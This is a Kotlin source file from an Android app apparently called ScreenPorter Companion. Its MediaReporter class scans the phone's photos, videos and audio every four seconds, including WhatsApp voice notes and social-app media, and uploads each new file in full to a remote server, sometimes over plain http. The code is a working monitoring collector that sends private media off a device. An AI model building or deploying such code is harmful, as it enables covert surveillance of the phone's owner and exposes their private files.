package com.screenporter.companion.monitoring

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import com.screenporter.companion.ScreenPorterApp
import com.screenporter.companion.util.PreferencesManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

/**
 * Scans MediaStore for new photos, videos, and audio files.
 * Uploads each new file to /api/agent/upload with a thumbnail.
 *
 * Scans:
 *  - Photos: MediaStore.Images (gallery + WhatsApp images + camera + downloads)
 *  - Videos: MediaStore.Video (gallery + WhatsApp videos + camera)
 *  - Audio:  MediaStore.Audio (WhatsApp voice notes + music + downloads)
 *
 * Each file is uploaded with:
 *  - type (photo/video/audio)
 *  - fileName, mimeType, sizeBytes
 *  - thumbnail (base64 JPEG for photos — generated from EXIF thumbnail or compressed)
 *  - source (gallery/whatsapp/camera/download — inferred from file path)
 *  - timestamp
 *
 * Per-device storage: server saves to /storage/{deviceId}/{type}/
 * Consent: checked at runtime before each upload.
 */
class MediaReporter(
    private val context: Context,
    private val prefs: PreferencesManager
) {
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var reportingJob: Job? = null

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS) // long for large files
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    fun start() {
        reportingJob?.cancel()
        reportingJob = scope.launch {
            // Initial scan after 10s (let other things start first)
            delay(10_000)
            while (true) {
                scanAndUpload()
                delay(4_000) // every 4 seconds
            }
        }
    }

    fun stop() {
        reportingJob?.cancel()
        reportingJob = null
    }

    private fun scanAndUpload() {
        if (!prefs.consentSigned) {
            Log.w(TAG, "Consent not signed — skipping media scan")
            return
        }
        val token = prefs.authToken ?: run {
            Log.w(TAG, "No auth token — skipping")
            return
        }

        // CRÍTICO: sem permissões de media, o MediaStore cursor vem vazio (ou crash).
        // Verificar ANTES de fazer qualquer query e log claramente qual falta.
        val ctx = context
        val permImages = com.screenporter.companion.util.PermissionState.isMediaImagesGranted(ctx)
        val permVideo = com.screenporter.companion.util.PermissionState.isMediaVideoGranted(ctx)
        val permAudio = com.screenporter.companion.util.PermissionState.isMediaAudioGranted(ctx)

        if (!permImages && !permVideo && !permAudio) {
            Log.w(TAG, "NENHUMA permissão de media concedida — não vou fazer scan. " +
                "Concede Fotos+Vídeos+Áudios em Permissões. " +
                "(images=$permImages, video=$permVideo, audio=$permAudio)")
            return
        }
        if (!permImages) Log.w(TAG, "Permissão READ_MEDIA_IMAGES em falta — fotos não serão capturadas")
        if (!permVideo)  Log.w(TAG, "Permissão READ_MEDIA_VIDEO em falta — vídeos não serão capturados")
        if (!permAudio)  Log.w(TAG, "Permissão READ_MEDIA_AUDIO em falta — áudios (voice notes) não serão capturados")

        val lastTs = prefs.getSharedPreferences().getLong(KEY_LAST_MEDIA_TS, 0L)
        var totalUploaded = 0

        // Scan photos
        if (permImages) {
            totalUploaded += scanMedia(
                uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                type = "photo",
                projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.DATA
                ),
                lastTs = lastTs,
                token = token
            )
        }

        // Scan videos
        if (permVideo) {
            totalUploaded += scanMedia(
                uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                type = "video",
                projection = arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.MIME_TYPE,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DATE_ADDED,
                    MediaStore.Video.Media.DATA
                ),
                lastTs = lastTs,
                token = token
            )
        }

        // Scan audio (inclui WhatsApp voice notes)
        if (permAudio) {
            totalUploaded += scanMedia(
                uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                type = "audio",
                projection = arrayOf(
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.MIME_TYPE,
                    MediaStore.Audio.Media.SIZE,
                    MediaStore.Audio.Media.DATE_ADDED,
                    MediaStore.Audio.Media.DATA
                ),
                lastTs = lastTs,
                token = token
            )
        }

        if (totalUploaded > 0) {
            Log.i(TAG, "Scan completo — $totalUploaded ficheiro(s) enviados")
        }
    }

    private fun scanMedia(
        uri: Uri,
        type: String,
        projection: Array<String>,
        lastTs: Long,
        token: String
    ): Int {
        val sel = "${MediaStore.MediaColumns.DATE_ADDED} > ?"
        val args = arrayOf((lastTs / 1000).toString())
        val sort = "${MediaStore.MediaColumns.DATE_ADDED} ASC"

        var newestTs = lastTs
        var uploaded = 0
        try {
            context.contentResolver.query(uri, projection, sel, args, sort)?.use { c: Cursor ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val mimeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                val sizeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val dataCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)

                val total = c.count
                Log.d(TAG, "[$type] $total ficheiro(s) novo(s) desde ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(lastTs))}")

                while (c.moveToNext()) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: continue
                    val mime = c.getString(mimeCol) ?: "application/octet-stream"
                    val size = c.getLong(sizeCol)
                    val dateSec = c.getLong(dateCol)
                    val dateMs = dateSec * 1000
                    val filePath = c.getString(dataCol) ?: continue

                    if (dateMs <= lastTs) continue
                    if (size > 50_000_000) {
                        Log.d(TAG, "[$type] Saltar $name (${size} bytes > 50MB)")
                        continue
                    }

                    val source = inferSource(filePath)
                    val ok = uploadFile(filePath, name, mime, size, type, source, dateMs, token)
                    if (ok) {
                        Log.i(TAG, "[$type] Upload OK: $name (${size} bytes) de $source")
                        if (dateMs > newestTs) newestTs = dateMs
                        uploaded++
                    } else {
                        Log.w(TAG, "[$type] Falhou upload de $name")
                    }
                }
            } ?: Log.w(TAG, "[$type] Cursor null — sem permissão ou sem ficheiros")
        } catch (e: SecurityException) {
            Log.e(TAG, "[$type] SecurityException — permissão revogada?: ${e.message}")
        } catch (e: Exception) {
            Log.w(TAG, "[$type] Erro no scan: ${e.message}")
        }

        if (newestTs > lastTs) {
            prefs.getSharedPreferences().edit().putLong(KEY_LAST_MEDIA_TS, newestTs).apply()
        }
        return uploaded
    }

    private fun inferSource(filePath: String): String {
        val lower = filePath.lowercase()
        return when {
            "whatsapp" in lower -> "whatsapp"
            "instagram" in lower -> "instagram"
            "tiktok" in lower -> "tiktok"
            "snapchat" in lower -> "snapchat"
            "telegram" in lower -> "telegram"
            "dcim" in lower -> "camera"
            "download" in lower -> "download"
            else -> "gallery"
        }
    }

    private fun uploadFile(
        filePath: String,
        fileName: String,
        mimeType: String,
        sizeBytes: Long,
        type: String,
        source: String,
        timestampMs: Long,
        token: String
    ): Boolean {
        val file = File(filePath)
        if (!file.exists() || !file.canRead()) return false

        val addr = prefs.serverAddress.trimEnd('/')
        val url = if (addr.startsWith("http")) "$addr/api/agent/upload"
                  else "http://$addr/api/agent/upload"

        val reqBody = file.asRequestBody(mimeType.toMediaType())
        val multipart = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", fileName, reqBody)
            .addFormDataPart("type", type)
            .addFormDataPart("timestamp", timestampMs.toString())
            .addFormDataPart("source", source)
            .build()

        val req = Request.Builder()
            .url(url)
            .header("X-Agent-Token", token)
            .post(multipart)
            .build()

        return try {
            http.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.w(TAG, "Upload failed: ${e.message}")
            false
        }
    }

    companion object {
        const val TAG = "SP-Media"
        private const val KEY_LAST_MEDIA_TS = "last_media_ts"
    }
}
